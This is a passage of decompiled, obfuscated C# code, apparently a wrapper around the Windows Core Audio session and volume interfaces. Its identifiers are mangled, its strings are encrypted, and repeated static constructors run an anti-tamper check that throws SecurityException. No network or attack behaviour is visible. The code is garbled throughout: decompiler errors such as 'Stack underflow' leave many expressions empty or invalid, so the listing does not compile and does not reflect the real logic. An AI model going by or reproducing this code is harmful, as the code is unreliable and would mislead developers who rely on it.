			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _000F
{
	[Flags]
	internal enum _000F
	{
		_0001 = 0,
		_0002 = 1,
		_0003 = 2,
		_0004 = 4
	}
}
namespace _0016
{
	internal struct _0016
	{
		public uint _0001;

		public int _0001;

		public global::_001A._0012 _0001;

		public _0017 _0001;
	}
}
namespace _0003
{
	internal enum _000F
	{
		_0001,
		_0002
	}
}
namespace _0005
{
	[Flags]
	internal enum _0012
	{
		_0001 = 0,
		_0002 = 0x10000,
		_0003 = 0x20000,
		_0004 = 0x40000,
		_0005 = 0x80000
	}
}
namespace _0016
{
	internal enum _0017
	{
		_0001,
		_0002
	}
}
namespace _001E
{
	internal sealed class _0011 : IDisposable
	{
		internal _0019._0018 _0001;

		public int Characteristics
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0011)/*Error near IL_000c: Stack underflow*/)._0001._0001(out uint result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return (int)result;
			}
		}

		public ulong Frequency
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0011)/*Error near IL_000c: Stack underflow*/)._0001._0001(out ulong result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return result;
			}
		}

		public ulong AdjustedPosition
		{
			get
			{
				//IL_0010: Unknown result type (might be due to invalid IL or missing references)
				//IL_0092: Incompatible stack heights: 0 vs 2
				//IL_009c: Incompatible stack heights: 0 vs 1
				//IL_00a2: Expected I8, but got Unknown
				_ = 10000000;
				_ = ((_0011)/*Error near IL_009c: Stack underflow*/).Frequency;
				ulong num = (ulong)(long)(/*Error near IL_0011: Stack underflow*/ / /*Error near IL_0011: Stack underflow*/);
				int num2 = 0;
				ulong num3;
				ulong num4 = default(ulong);
				while (!global::_0011._0018._0001(this, out num3, ref num4) && ++num2 != 5)
				{
				}
				if (Stopwatch.IsHighResolution)
				{
					ulong num5 = (_008C_0003._0088_0007(_008B_0003._0087_0007(_008B_0003._0086_0007(_008A_0003._0084_0007(_0089_0003._0083_0007()), 10000000m), _008A_0003._0084_0007(Stopwatch.Frequency))) - num4) / 100uL / num;
					return num3 + num5;
				}
				return num3;
			}
		}

		public bool CanAdjustPosition => Stopwatch.IsHighResolution;

		internal _0011(_0019._0018 _0090_0091_0006)
		{
			this._0001 = _0090_0091_0006;
		}

		public void _0001()
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 2
			//IL_0036: Incompatible stack heights: 0 vs 1
			if (((_0011)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_ = _0098._008A_0004;
				_0019._0018 obj = ((_0011)/*Error near IL_0015: Stack underflow*/)._0001;
				/*Error near IL_0036: Stack underflow*/(obj);
				this._0001 = null;
				_0091_0002._009B_0005(this);
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}
	}
}
namespace _0019
{
	internal sealed class _0014 : global::_0017._001C
	{
		private readonly global::_0080._0011 m__0001;

		internal _0014(global::_0080._0011 _0083_0019)
		{
			this.m__0001 = _0083_0019;
		}

		public void _0001(IntPtr _0002)
		{
			//IL_009d: Incompatible stack heights: 0 vs 1
			//IL_00a7: Incompatible stack heights: 0 vs 1
			global::_0004._000F._0001<_0017>((IntPtr)/*Error near IL_00a7: Stack underflow*/);
			_0017 obj = (_0017)/*Error near IL_00ad: Stack underflow*/;
			IntPtr intPtr = global::_0004._000F._0001<_0017>(global::_0080._0014._0001(107406759));
			IntPtr intPtr2 = _009C._0092_0004(_008D_0003._0089_0007(_0002) + _008D_0003._0089_0007(intPtr));
			float[] array = new float[obj._0001];
			for (int i = 0; i < obj._0001; i++)
			{
				array[i] = global::_0004._000F._0001<float>(intPtr2);
			}
			global::_000E._001B obj2 = new global::_000E._001B(obj._0001, obj._0001, obj._0001, array, obj._0001);
			global::_0011._0018._0001(obj2, this.m__0001);
		}

		static _0014()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0017
{
	[Guid("657804FA-D6AD-4496-8A60-352752AF4F89")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	internal interface _001C
	{
		void _0001(IntPtr _0002);
	}
}
namespace _0016
{
	internal sealed class _0018
	{
		private readonly uint _0001;

		private readonly global::_0006._0014 _0001;

		private Guid _0001 = Guid.Empty;

		public Guid NotificationGuid
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0018)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0018)/*Error near IL_0009: Stack underflow*/)._0001 = (Guid)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public float VolumeLevel
		{
			get
			{
				//IL_001f: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 2
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				_ = ((_0018)/*Error near IL_000c: Stack underflow*/)._0001;
				uint num = ((_0018)/*Error near IL_0013: Stack underflow*/)._0001;
				((global::_0006._0014)/*Error near IL_0029: Stack underflow*/)._0001(num, out float result);
				/*Error near IL_001c: Stack underflow*/((int)/*Error near IL_001c: Stack underflow*/);
				return result;
			}
			set
			{
				//IL_0027: Incompatible stack heights: 0 vs 2
				//IL_002a: Incompatible stack heights: 0 vs 2
				//IL_002d: Incompatible stack heights: 0 vs 2
				_ = global::_0007._0097;
				_ = ((_0018)/*Error near IL_000c: Stack underflow*/)._0001;
				_ = ((_0018)/*Error near IL_0013: Stack underflow*/)._0001;
				ref Guid reference = ref _0001;
				int num = ((global::_0006._0014)/*Error near IL_0020: Stack underflow*/)._0001((uint)/*Error near IL_0020: Stack underflow*/, (float)/*Error near IL_0020: Stack underflow*/, ref reference);
				/*Error near IL_0025: Stack underflow*/(num);
			}
		}

		public float VolumeLevelScalar
		{
			get
			{
				//IL_001f: Incompatible stack heights: 0 vs 2
				//IL_0022: Incompatible stack heights: 0 vs 2
				//IL_0029: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				_ = ((_0018)/*Error near IL_000c: Stack underflow*/)._0001;
				uint num = ((_0018)/*Error near IL_0013: Stack underflow*/)._0001;
				((global::_0006._0014)/*Error near IL_0029: Stack underflow*/)._0002(num, out float result);
				/*Error near IL_001c: Stack underflow*/((int)/*Error near IL_001c: Stack underflow*/);
				return result;
			}
			set
			{
				//IL_0027: Incompatible stack heights: 0 vs 2
				//IL_002a: Incompatible stack heights: 0 vs 2
				//IL_002d: Incompatible stack heights: 0 vs 2
				_ = global::_0007._0097;
				_ = ((_0018)/*Error near IL_000c: Stack underflow*/)._0001;
				_ = ((_0018)/*Error near IL_0013: Stack underflow*/)._0001;
				ref Guid reference = ref _0001;
				int num = ((global::_0006._0014)/*Error near IL_0020: Stack underflow*/)._0002((uint)/*Error near IL_0020: Stack underflow*/, (float)/*Error near IL_0020: Stack underflow*/, ref reference);
				/*Error near IL_0025: Stack underflow*/(num);
			}
		}

		internal _0018(global::_0006._0014 _0083_0019, int _008D_0090_0006)
		{
			this._0001 = (uint)_008D_0090_0006;
			this._0001 = _0083_0019;
		}
	}
}
namespace _0005
{
	internal sealed class _0013
	{
		private readonly global::_0006._0014 _0001;

		private readonly global::_0016._0018[] _0001;

		public int Count
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0013)/*Error near IL_000c: Stack underflow*/)._0001._0001(out int result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return result;
			}
		}

		public global::_0016._0018 this[int _0002]
		{
			get
			{
				//IL_000c: Incompatible stack heights: 0 vs 1
				//IL_000f: Incompatible stack heights: 0 vs 2
				_ = ((_0013)/*Error near IL_0007: Stack underflow*/)._0001;
				return (global::_0016._0018)((object[])/*Error near IL_000a: Stack underflow*/)[/*Error near IL_000a: Stack underflow*/];
			}
		}

		internal _0013(global::_0006._0014 _0083_0019)
		{
			this._0001 = _0083_0019;
			int num = Count;
			_0001 = new global::_0016._0018[num];
			for (int i = 0; i < num; i++)
			{
				_0001[i] = new global::_0016._0018(this._0001, i);
			}
		}

		static _0013()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0017
{
	internal delegate void _001A(global::_000E._001B data);
}
namespace _0007
{
	internal sealed class _0015
	{
		private readonly uint _0001;

		private readonly uint _0002;

		public uint Step => ((_0015)/*Error near IL_0007: Stack underflow*/)._0001;

		public uint StepCount => ((_0015)/*Error near IL_0007: Stack underflow*/)._0002;

		internal _0015(global::_0006._0014 _0083_0019)
		{
			Marshal.ThrowExceptionForHR(_0083_0019._0001(out _0001, out _0002));
		}
	}
}
namespace _0010
{
	internal sealed class _0015
	{
		private readonly float _0001;

		private readonly float _0002;

		private readonly float _0003;

		public float MinDecibels => ((_0015)/*Error near IL_0007: Stack underflow*/)._0001;

		public float MaxDecibels => ((_0015)/*Error near IL_0007: Stack underflow*/)._0002;

		public float IncrementDecibels => ((_0015)/*Error near IL_0007: Stack underflow*/)._0003;

		internal _0015(global::_0006._0014 _0083_0019)
		{
			Marshal.ThrowExceptionForHR(_0083_0019._0001(out _0001, out _0002, out _0003));
		}

		static _0015()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _001C
{
	internal sealed class _0011
	{
		private readonly global::_0002._0016 _0001;

		public int Count
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0011)/*Error near IL_000c: Stack underflow*/)._0001._0001(out int result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return result;
			}
		}

		public float this[int _0002]
		{
			get
			{
				//IL_0043: Incompatible stack heights: 0 vs 1
				//IL_004a: Incompatible stack heights: 0 vs 1
				_ = ((_0011)/*Error near IL_004a: Stack underflow*/).Count;
				float[] array = new float[/*Error near IL_0009: Stack underflow*/];
				GCHandle gCHandle = _008E_0003._008A_0007(array, GCHandleType.Pinned);
				global::_0007._0097(_0001._0001(array.Length, gCHandle.AddrOfPinnedObject()));
				gCHandle.Free();
				return array[_0002];
			}
		}

		internal _0011(global::_0002._0016 _0083_0019)
		{
			_0001 = _0083_0019;
		}
	}
}
namespace _0005
{
	internal sealed class _0014 : IDisposable
	{
		internal global::_0012._0011 _0001;

		internal _0014(global::_0012._0011 _0091_0091_0006)
		{
			this._0001 = _0091_0091_0006;
		}

		public void _0001()
		{
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 2
			//IL_0036: Incompatible stack heights: 0 vs 1
			if (((_0014)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_ = _0098._008A_0004;
				global::_0012._0011 obj = ((_0014)/*Error near IL_0015: Stack underflow*/)._0001;
				/*Error near IL_0036: Stack underflow*/(obj);
				this._0001 = null;
				_0091_0002._009B_0005(this);
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		static _0014()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001B
{
	internal sealed class _0014 : IDisposable
	{
		internal readonly global::_0018._0017 _0001;

		private readonly _001C._0012 m__0001;

		internal _0015 _0001;

		internal global::_0010._0018 _0001;

		internal global::_0010._0017 _0001;

		public global::_0010._0018 AudioMeterInformation => ((_0014)/*Error near IL_0007: Stack underflow*/)._0001;

		public global::_0010._0017 SimpleAudioVolume => ((_0014)/*Error near IL_0007: Stack underflow*/)._0001;

		public global::_0008._0010 State
		{
			get
			{
				//IL_0015: Incompatible stack heights: 0 vs 2
				//IL_001c: Incompatible stack heights: 0 vs 1
				_ = global::_0007._0097;
				((_0014)/*Error near IL_000c: Stack underflow*/)._0001._0001(out global::_0008._0010 result);
				/*Error near IL_0023: Stack underflow*/((int)/*Error near IL_0023: Stack underflow*/);
				return result;
			}
		}

		public string DisplayName
		{
			get
			{
				//IL_0022: Incompatible stack heights: 0 vs 2
				//IL_0029: Incompatible stack heights: 0 vs 1
				string empty = string.Empty;
				_ = global::_0007._0097;
				((_0014)/*Error near IL_0013: Stack underflow*/)._0001._0001(out empty);
				/*Error near IL_001c: Stack underflow*/((int)/*Error near IL_001c: Stack underflow*/);
				return empty;
			}
			set
			{
				//IL_002e: Incompatible stack heights: 0 vs 2
				//IL_0035: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 2
				_ = _0010_0003._008C_0006;
				string empty = string.Empty;
				/*Error near IL_0035: Stack underflow*/((string)/*Error near IL_0035: Stack underflow*/, empty);
				if ((int)/*Error near IL_0010: Stack underflow*/ != 0)
				{
					_ = global::_0007._0097;
					int num = ((_0014)/*Error near IL_001c: Stack underflow*/)._0001._0001(value, Guid.Empty);
					/*Error near IL_002c: Stack underflow*/(num);
				}
			}
		}

		public string IconPath
		{
			get
			{
				//IL_0022: Incompatible stack heights: 0 vs 2
				//IL_0029: Incompatible stack heights: 0 vs 1
				string empty = string.Empty;
				_ = global::_0007._0097;
				((_0014)/*Error near IL_0013: Stack underflow*/)._0001._0002(out empty);
				/*Error near IL_001c: Stack underflow*/((int)/*Error near IL_001c: Stack underflow*/);
				return empty;
			}
			set
			{
				//IL_002e: Incompatible stack heights: 0 vs 2
				//IL_0035: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 2
				_ = _0010_0003._008C_0006;
				string empty = string.Empty;
				/*Error near IL_0035: Stack underflow*/((string)/*Error near IL_0035: Stack underflow*/, empty);
				if ((int)/*Error near IL_0010: Stack underflow*/ != 0)
				{
					_ = global::_0007._0097;
					int num = ((_0014)/*Error near IL_001c: Stack underflow*/)._0001._0002(value, Guid.Empty);
					/*Error near IL_002c: Stack underflow*/(num);
				}
			}
		}

		public string GetSessionIdentifier
		{
			get
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0034: Incompatible stack heights: 0 vs 1
				//IL_003b: Incompatible stack heights: 0 vs 1
				if (((_0014)/*Error near IL_0007: Stack underflow*/).m__0001 == null)
				{
					_0080._0014._0001(107406770);
					new InvalidOperationException((string?)/*Error near IL_003b: Stack underflow*/);
					throw /*Error near IL_0013: Stack underflow*/;
				}
				global::_0007._0097(this.m__0001._0003(out var result));
				return result;
			}
		}

		public string GetSessionInstanceIdentifier
		{
			get
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0034: Incompatible stack heights: 0 vs 1
				//IL_003b: Incompatible stack heights: 0 vs 1
				if (((_0014)/*Error near IL_0007: Stack underflow*/).m__0001 == null)
				{
					_0080._0014._0001(107406770);
					new InvalidOperationException((string?)/*Error near IL_003b: Stack underflow*/);
					throw /*Error near IL_0013: Stack underflow*/;
				}
				global::_0007._0097(this.m__0001._0004(out var result));
				return result;
			}
		}

		public uint GetProcessID
		{
			get
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0034: Incompatible stack heights: 0 vs 1
				//IL_003b: Incompatible stack heights: 0 vs 1
				if (((_0014)/*Error near IL_0007: Stack underflow*/).m__0001 == null)
				{
					_0080._0014._0001(107406770);
					new InvalidOperationException((string?)/*Error near IL_003b: Stack underflow*/);
					throw /*Error near IL_0013: Stack underflow*/;
				}
				global::_0007._0097(this.m__0001._0001(out uint result));
				return result;
			}
		}

		public bool IsSystemSoundsSession
		{
			get
			{
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_002a: Incompatible stack heights: 0 vs 1
				//IL_0031: Incompatible stack heights: 0 vs 1
				if (((_0014)/*Error near IL_0007: Stack underflow*/).m__0001 == null)
				{
					_0080._0014._0001(107406770);
					new InvalidOperationException((string?)/*Error near IL_0031: Stack underflow*/);
					throw /*Error near IL_0013: Stack underflow*/;
				}
				return this.m__0001._0001() == 0;
			}
		}

		public _0014(global::_0018._0017 _0092_0091_0006)
		{
			this._0001 = _0092_0091_0006;
			this.m__0001 = _0092_0091_0006 as _001C._0012;
			global::_0002._0016 obj = this._0001 as global::_0002._0016;
			_001F._0016 obj2 = this._0001 as _001F._0016;
			if (obj != null)
			{
				this._0001 = new global::_0010._0018(obj);
			}
			if (obj2 != null)
			{
				this._0001 = new global::_0010._0017(obj2);
			}
		}

		public void _0001()
		{
			//IL_003a: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0040: Incompatible stack heights: 0 vs 2
			if (((_0014)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_ = global::_0007._0097;
				_ = ((_0014)/*Error near IL_0015: Stack underflow*/)._0001;
				_0015 obj = ((_0014)/*Error near IL_001c: Stack underflow*/)._0001;
				int num = ((global::_0018._0017)/*Error near IL_0021: Stack underflow*/)._0002((global::_000F._0010)obj);
				/*Error near IL_0026: Stack underflow*/(num);
				this._0001 = null;
			}
			_0091_0002._009B_0005(this);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0001();
		}

		protected override void _0002()
		{
			//IL_0007: Incompatible stack heights: 0 vs 1
			try
			{
				((_0014)/*Error near IL_000e: Stack underflow*/)._0001();
			}
			finally
			{
				global::_0008._009E(this);
			}
		}
	}
	internal sealed class _0015 : global::_000F._0010
	{
		private readonly global::_0003._0011 m__0001;

		public _0015(global::_0003._0011 _0093_0091_0006)
		{
			this.m__0001 = _0093_0091_0006;
		}

		public int _0001([In][MarshalAs(UnmanagedType.LPWStr)] string _0002, [In] ref Guid _0003)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0011: Incompatible stack heights: 0 vs 2
			_ = ((_0015)/*Error near IL_0007: Stack underflow*/).m__0001;
			((global::_0003._0011)/*Error near IL_0018: Stack underflow*/)._0001((string)/*Error near IL_0018: Stack underflow*/);
			return 0;
		}

		public int _0002([In][MarshalAs(UnmanagedType.LPWStr)] string _0002, [In] ref Guid _0003)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0011: Incompatible stack heights: 0 vs 2
			_ = ((_0015)/*Error near IL_0007: Stack underflow*/).m__0001;
			((global::_0003._0011)/*Error near IL_0018: Stack underflow*/)._0002((string)/*Error near IL_0018: Stack underflow*/);
			return 0;
		}

		public int _0001([In][MarshalAs(UnmanagedType.R4)] float _0002, [In][MarshalAs(UnmanagedType.Bool)] bool _0003, [In] ref Guid _0004)
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 2
			//IL_0019: Incompatible stack heights: 0 vs 1
			_ = ((_0015)/*Error near IL_0007: Stack underflow*/).m__0001;
			((global::_0003._0011)/*Error near IL_0010: Stack underflow*/)._0001((float)/*Error near IL_0010: Stack underflow*/, (byte)/*Error near IL_0010: Stack underflow*/ != 0);
			return 0;
		}

		public int _0001([In][MarshalAs(UnmanagedType.U4)] uint _0002, [In][MarshalAs(UnmanagedType.SysInt)] IntPtr _0003, [In][MarshalAs(UnmanagedType.U4)] uint _0004, [In] ref Guid _0005)
		{
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_0017: Incompatible stack heights: 0 vs 2
			//IL_001a: Incompatible stack heights: 0 vs 1
			_ = ((_0015)/*Error near IL_0007: Stack underflow*/).m__0001;
			((global::_0003._0011)/*Error near IL_0011: Stack underflow*/)._0001((uint)/*Error near IL_0011: Stack underflow*/, (IntPtr)/*Error near IL_0011: Stack underflow*/, _0004);
			return 0;
		}

		public unsafe int _0001([In] ref Guid _0002, [In] ref Guid _0003)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0011: Incompatible stack heights: 0 vs 2
			_ = ((_0015)/*Error near IL_0007: Stack underflow*/).m__0001;
			((global::_0003._0011)/*Error near IL_0018: Stack underflow*/)._0001(ref *(Guid*)/*Error near IL_0018: Stack underflow*/);
			return 0;
		}

		public int _0001([In] global::_0008._0010 _0002)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0011: Incompatible stack heights: 0 vs 2
			_ = ((_0015)/*Error near IL_0007: Stack underflow*/).m__0001;
			((global::_0003._0011)/*Error near IL_0018: Stack underflow*/)._0001((global::_0008._0010)/*Error near IL_0018: Stack underflow*/);
			return 0;
		}

		public int _0001([In] global::_0010._001A _0002)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0011: Incompatible stack heights: 0 vs 2
			_ = ((_0015)/*Error near IL_0007: Stack underflow*/).m__0001;
			((global::_0003._0011)/*Error near IL_0018: Stack underflow*/)._0001((global::_0010._001A)/*Error near IL_0018: Stack underflow*/);
			return 0;
		}

		static _0015()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _000F
{
	[Guid("24918ACC-64B3-37C1-8CA9-74A66E9957A8")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	public interface _0010
	{
		[PreserveSig]
		int _0001([In][MarshalAs(UnmanagedType.LPWStr)] string _0002, [In] ref Guid _0003);

		[PreserveSig]
		int _0002([In][MarshalAs(UnmanagedType.LPWStr)] string _0002, [In] ref Guid _0003);

		[PreserveSig]
		int _0001([In][MarshalAs(UnmanagedType.R4)] float _0002, [In][MarshalAs(UnmanagedType.Bool)] bool _0003, [In] ref Guid _0004);

		[PreserveSig]
		int _0001([In][MarshalAs(UnmanagedType.U4)] uint _0002, [In][MarshalAs(UnmanagedType.SysInt)] IntPtr _0003, [In][MarshalAs(UnmanagedType.U4)] uint _0004, [In] ref Guid _0005);

		[PreserveSig]
		int _0001([In] ref Guid _0002, [In] ref Guid _0003);

		[PreserveSig]
		int _0001([In] global::_0008._0010 _0002);

		[PreserveSig]
		int _0001([In] global::_0010._001A _0002);
	}
}
namespace _0017
{
	internal sealed class _001B
	{
		public delegate void _0001(object sender, global::_0018._0017 newSession);

		private readonly global::_0007._0016 m__0001;

		internal readonly global::_007F._0015 _0001;

		internal global::_0010._0016 _0001;

		internal global::_0005._0015 _0001;

		private global::_0010._0017 m__0001;

		private global::_001B._0014 m__0001;

		[CompilerGenerated]
		internal _0001 _0001;

		public global::_0010._0017 SimpleAudioVolume
		{
			get
			{
				//IL_002f: Incompatible stack heights: 0 vs 1
				//IL_0032: Incompatible stack heights: 0 vs 1
				//IL_0039: Incompatible stack heights: 0 vs 1
				if (((_001B)/*Error near IL_0007: Stack underflow*/).m__0001 == null)
				{
					((_001B)/*Error near IL_0010: Stack underflow*/).m__0001._0001(Guid.Empty, 0u, out global::_001F._0016 obj);
					this.m__0001 = new global::_0010._0017(obj);
				}
				return this.m__0001;
			}
		}

		public global::_001B._0014 AudioSessionControl
		{
			get
			{
				//IL_002f: Incompatible stack heights: 0 vs 1
				//IL_0032: Incompatible stack heights: 0 vs 1
				//IL_0039: Incompatible stack heights: 0 vs 1
				if (((_001B)/*Error near IL_0007: Stack underflow*/).m__0001 == null)
				{
					((_001B)/*Error near IL_0010: Stack underflow*/).m__0001._0001(Guid.Empty, 0u, out global::_0018._0017 obj);
					this.m__0001 = new global::_001B._0014(obj);
				}
				return this.m__0001;
			}
		}

		public global::_0005._0015 Sessions => ((_001B)/*Error near IL_0007: Stack underflow*/)._0001;

		public event _0001 OnSessionCreated
		{
			[CompilerGenerated]
			add
			{
				//IL_0032: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				_0001 obj = ((_001B)/*Error near IL_0007: Stack underflow*/)._0001;
				_0001 obj2;
				do
				{
					obj2 = (_0001)/*Error near IL_000c: Stack underflow*/;
					_0001 value2 = (_0001)_0005_0002._009F_0004(obj2, value);
					obj = Interlocked.CompareExchange(ref this._0001, value2, obj2);
				}
				while ((object)obj != obj2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_0032: Incompatible stack heights: 0 vs 1
				//IL_0038: Incompatible stack heights: 0 vs 1
				_0001 obj = ((_001B)/*Error near IL_0007: Stack underflow*/)._0001;
				_0001 obj2;
				do
				{
					obj2 = (_0001)/*Error near IL_000c: Stack underflow*/;
					_0001 value2 = (_0001)_0005_0002._0001_0005(obj2, value);
					obj = Interlocked.CompareExchange(ref this._0001, value2, obj2);
				}
				while ((object)obj != obj2);
			}
		}

		internal _001B(global::_0007._0016 _0094_0091_0006)
		{
			this.m__0001 = _0094_0091_0006;
			this._0001 = _0094_0091_0006 as global::_007F._0015;
			global::_0011._0018._0001(this);
		}

		protected override void _0001()
		{
			//IL_0007: Incompatible stack heights: 0 vs 1
			try
			{
				global::_0011._0018._0001((_001B)/*Error near IL_000e: Stack underflow*/);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}
	}
}
namespace _0010
{
	internal sealed class _0016 : global::_0017._001D
	{
		private global::_0017._001B m__0001;

		internal _0016(global::_0017._001B _0083_0019)
		{
			this.m__0001 = _0083_0019;
		}

		[PreserveSig]
		public int _0001(global::_0018._0017 _0002)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0011: Incompatible stack heights: 0 vs 2
			_ = ((_0016)/*Error near IL_0007: Stack underflow*/).m__0001;
			global::_0011._0018._0001((global::_0017._001B)/*Error near IL_0018: Stack underflow*/, (global::_0018._0017)/*Error near IL_0018: Stack underflow*/);
			return 0;
		}

		static _0016()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0017
{
	[Guid("641DD20B-4D41-49CC-ABA3-174B9477BB08")]
	[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
	public interface _001D
	{
		[PreserveSig]
		int _0001(global::_0018._0017 _0002);
	}
}
namespace _001A
{
	internal enum _0012
	{
		_0001,
		_0002,
